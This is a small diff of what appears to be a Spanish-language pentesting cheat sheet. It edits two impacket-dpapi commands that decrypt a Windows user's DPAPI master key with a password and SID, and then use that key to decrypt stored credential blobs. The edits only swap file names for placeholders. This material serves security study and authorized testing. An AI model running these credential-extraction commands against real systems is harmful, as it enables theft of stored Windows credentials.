@@ -91,13 +91,13 @@ CD C:\Users\{Usuario}\AppData\Roaming\Microsoft\Protect\<SID del usuario>\
 ### Desencriptando  MasterKey usando credenciales
 
 ```ruby
-impacket-dpapi masterkey -file masterkey_blob -password '{Password}' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
+impacket-dpapi masterkey -file {MASTERKEY_FILE} -password '{Password}' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
 ```
 
 ### Desencriptando BLOB con masterkey
 
 ```ruby
-impacket-dpapi credential -file credential_blob -key {MasterKey(OBTENIDA ANTERIORMENTE)}   
+impacket-dpapi credential -file {BLOB ARCHIVO} -key { MasterKey (OBTENIDA ANTERIORMENTE)}   
 ```
 
 
